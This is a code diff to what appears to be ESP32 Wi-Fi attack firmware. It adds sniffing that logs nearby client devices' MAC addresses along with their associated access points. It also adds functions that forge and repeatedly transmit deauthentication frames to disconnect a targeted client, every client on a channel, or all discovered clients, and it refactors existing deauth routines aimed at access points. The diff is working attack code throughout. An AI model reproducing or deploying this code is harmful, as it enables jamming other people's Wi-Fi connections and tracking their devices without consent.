@@ -35,6 +35,8 @@ bool useOnlyNonDFS = true;
 macAddr macStore[STORE_LEN];
 uint8_t macCursor = 0;
 
+std::map<uint8_t,std::vector<STAInfo>> channelSTAMap;
+
 std::map<uint8_t, std::vector<BSSIDInfo>> channelAPMap;
 uint8_t totalAPCount = 0;
 
@@ -98,6 +100,65 @@ bool isDFSChannel(uint8_t ch){
   return(ch >= 52 && ch <= 140);
 }
 
+uint16_t totalSTACount = 0;
+
+int findSTA(const uint8_t* mac){
+  for(auto& entry: channelSTAMap){
+    for(auto& sta: entry.second){
+      if(memcmp(sta.staMac.data(),mac,6) == 0) return 1;
+    }
+  }
+  return -1;
+}
+
+void addOrUpdateSTA(const uint8_t* staMac,const uint8_t* apMac,uint8_t channel){
+  if(channelSTAMap.find(channel) != channelSTAMap.end()){
+    for(auto& sta: channelSTAMap[channel]){
+      if(memcmp(sta.staMac.data(),staMac,6) == 0){
+        sta.update();
+        if(memcmp(sta.staMac.data(),apMac,6) != 0) memcpy(sta.apMac.data(),apMac,6);
+        return;
+      }
+    }
+  }
+  // add new sta
+  STAInfo newSTA(staMac,apMac);
+  channelSTAMap[channel].push_back(newSTA);
+  totalSTACount++;
+
+  Serial.printf("[WIFI] new client found: %02X:%02X:%02X:%02X:%02X:%02X -> AP %02X:%02X:%02X:%02X:%02X:%02X CH: %d \n",
+                staMac[0],staMac[1],staMac[2],staMac[3],staMac[4],staMac[5],
+                apMac[0],apMac[1],apMac[2],apMac[3],apMac[4],apMac[5],
+                channel
+                );
+}
+
+void nx::wifi::clearSTAMap(){
+  channelSTAMap.clear();
+  totalSTACount = 0;
+  debug_print("STA map clear");
+}
+
+uint8_t nx::wifi::getSTACount() {
+  return totalSTACount;
+}
+
+std::vector<STAInfo> nx::wifi::getSTAsByChannel(uint8_t channel){
+  if(channelSTAMap.find(channel) != channelSTAMap.end()) return channelSTAMap[channel];
+  return std::vector<STAInfo>();
+}
+
+std::vector<STAInfo> nx::wifi::getSTAsByAP(const uint8_t* apMac){
+  std::vector<STAInfo> result;
+
+  for(auto& entry: channelSTAMap){
+    for(auto& sta: entry.second){
+      if(memcmp(sta.apMac.data(),apMac,6) == 0) result.push_back(sta);
+    }
+  }
+  return result;
+}
+
 void IRAM_ATTR snifferCallback(void* buf , wifi_promiscuous_pkt_type_t type){
   if (!packetMonitorActive) return;
   
@@ -143,17 +204,33 @@ void IRAM_ATTR snifferCallback(void* buf , wifi_promiscuous_pkt_type_t type){
     // Addr 3 (Bssid): offset16
     const uint8_t* addr1 = &payload[4];
     const uint8_t* addr2 = &payload[10];
+    const uint8_t* addr3 = &payload[16];
 
     if(macBroadcast(addr1) || macBroadcast(addr2) || !macValid(addr1) || !macValid(addr2) || macMulticast(addr1) || macMulticast(addr2)) return;
 
     int apFound = findAP(addr2);
     if(apFound >= 0){
       // Station add (addr1 -> station)
+      addOrUpdateSTA(addr1,addr2,ctrl->channel);
     }
     else{
       apFound = findAP(addr1);
       if(apFound >=0){
         // Station add (addr2 -> station)
+        addOrUpdateSTA(addr2,addr1,ctrl->channel);
+      }
+      else{
+        // addr3 check (bssid)
+        apFound = findAP(addr3);
+        if(apFound >= 0){
+          uint8_t flags = payload[1];
+          bool toDS = flags & 0x01;
+          bool fromDS = flags & 0x02;
+          // STA -> AP: addr2 is STA
+          if(toDS && !fromDS) addOrUpdateSTA(addr2,addr3,ctrl->channel);
+          // AP -> STA: addr1 is STA
+          else if(!toDS && fromDS) addOrUpdateSTA(addr1,addr3,ctrl->channel);
+        }
       }
     }
   
@@ -268,15 +345,9 @@ void nx::wifi::txDeauthFrameAll(){
     auto& bssids = entry.second;
     
     if(bssids.empty()) continue;
-    setBandChannel(channel);
-    
+
     for(auto& bssidInfo : bssids){
-      uint8_t pkt[26];
-      memcpy_P(pkt, deauthFrameTemplate, 26);
-      memcpy(&pkt[10], bssidInfo.bssid.data(), 6);
-      memcpy(&pkt[16], bssidInfo.bssid.data(), 6);
-      
-      for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+      txDeauthFrameBSSID(bssidInfo.bssid.data(),channel);
     }
   }
 }
@@ -290,15 +361,8 @@ void nx::wifi::txDeauthFrameChannel(uint8_t channel){
   auto& bssids = channelAPMap[channel];
   if(bssids.empty()) return;
   
-  setBandChannel(channel);
-  
   for(auto& bssidInfo :  bssids){
-    uint8_t pkt[26];
-    memcpy_P(pkt, deauthFrameTemplate, 26);
-    memcpy(&pkt[10], bssidInfo.bssid.data(), 6);
-    memcpy(&pkt[16], bssidInfo.bssid.data(), 6);
-    
-    for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+    txDeauthFrameBSSID(bssidInfo.bssid.data(),channel);
   }
 }
 
@@ -316,6 +380,40 @@ void nx::wifi::txDeauthFrameBSSID(const uint8_t* bssid, uint8_t channel){
   memcpy(&pkt[16], bssid, 6);
   
   for(uint8_t i = 0; i < PER_PKT; i++) esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+}
+
+void nx::wifi::txDeauthFrameSTA(const uint8_t* staMac,const uint8_t* apMac,uint8_t channel){
+  if(staMac == nullptr || apMac == nullptr) return;
+
+  setBandChannel(channel);
+
+  uint8_t pkt[26];
+
+  memcpy_P(pkt,deauthFrameTemplate,26);
+  memcpy(&pkt[4],staMac,6); // Destination: STA
+  memcpy(&pkt[10],apMac,6); // Soruce: AP
+  memcpy(&pkt[16],apMac,6); // BSSID: AP
+  
+  for(uint8_t i = 0 ; i < PER_PKT;i++) esp_wifi_80211_tx(WIFI_IF_STA,pkt,sizeof(pkt),false);
+}
+
+void nx::wifi::txDeauthFrameAllSTAs(){
+  if(channelSTAMap.empty()) return;
+
+  for(auto& entry: channelSTAMap){
+    uint8_t channel = entry.first;
+    auto& stations = entry.second;
+
+    for (auto& sta : stations)txDeauthFrameSTA(sta.staMac.data(),sta.apMac.data(),channel);
+  }
+}
+
+void nx::wifi::txDeauthFrameSTAsByChannel(uint8_t channel){
+  if(channelSTAMap.find(channel) == channelSTAMap.end()) return;
+  auto& stations = channelSTAMap[channel];
+  if(stations.empty()) return;
+
+  for(auto& sta: stations) txDeauthFrameSTA(sta.staMac.data(),sta.apMac.data(),channel);
 }
 
 void nx::wifi::txBeaconFrame(const char* ssid, uint8_t channel, const uint8_t* bssid, bool encrypted){
@@ -690,6 +788,78 @@ void nx::wifi::performProgressiveScan(){
       scanComplete = true;
     }
   }
+}
+
+void nx::wifi::startSTAScan(){
+  if(staScanActive){
+    debug_print("STA scan already active");
+    return;
+  }
+  if(channelAPMap.empty()){
+    debug_print("Please scan APs first before scanning STAs");
+    return;
+  }
+
+  channelSTAMap.clear();
+  totalSTACount = 0;
+
+  staChannelIndex = 0;
+  lastSTAScan = 0;
+  staScanComplete = false;
+  staScanActive = true;
+
+  if(!packetMonitorActive) startPacketMonitor();
+  debug_print("Progressive STA scan started");
+}
+
+void nx::wifi::stopSTAScan(){
+  if(!staScanActive){
+    debug_print("STA scan not active");
+    return;
+  }
+  staScanActive = false;
+  staScanComplete = true;
+
+  debug_print("STA scan stop");
+}
+
+int nx::wifi::scanSTAOnChannel(uint8_t channel){
+  if(channelAPMap.find(channel) == channelAPMap.end()) return 0;
+
+  setBandChannel(channel);
+
+  int prevCount = 0;
+  if(channelSTAMap.find(channel) != channelSTAMap.end()) prevCount = channelSTAMap[channel].size();
+
+  unsigned long scanStart = millis();
+  while(millis() - scanStart < PACKET_MONITOR_CHANNEL_HOPPING_INTERVAL){
+    updatePacketMonitor();
+    delay(10);
+  }
+  int currentCount = 0;
+  if(channelSTAMap.find(channel) != channelSTAMap.end()) currentCount = channelSTAMap[channel].size();
+
+  int foundSTAs = currentCount - prevCount;
+
+  if(foundSTAs > 0) Serial.printf("[WIFI] Ch %d: Found %d new station(s)\n",channel,foundSTAs);
+  return foundSTAs;
+}
+
+void nx::wifi::performProgressiveSTAScan(){
+
+  if(!staScanActive) return;
+
+  if(staChannelIndex == 0 && millis() - lastSTAScan > staScanInterval) debug_print("Starting new STA scan cycle....");
+  if(millis() - lastSTAScan > staScanInterval){
+    uint8_t channel = channelList[staChannelIndex];
+
+    if(channelAPMap.find(channel) != channelAPMap.end() && !channelAPMap[channel].empty()) scanSTAOnChannel(channel);
+
+    staChannelIndex = (staChannelIndex + 1) % channelCount;
+    lastSTAScan = millis();
+    if(staChannelIndex == 0) staScanComplete = true;
+  }
+
 }
 
 void nx::wifi::startPacketMonitor(){
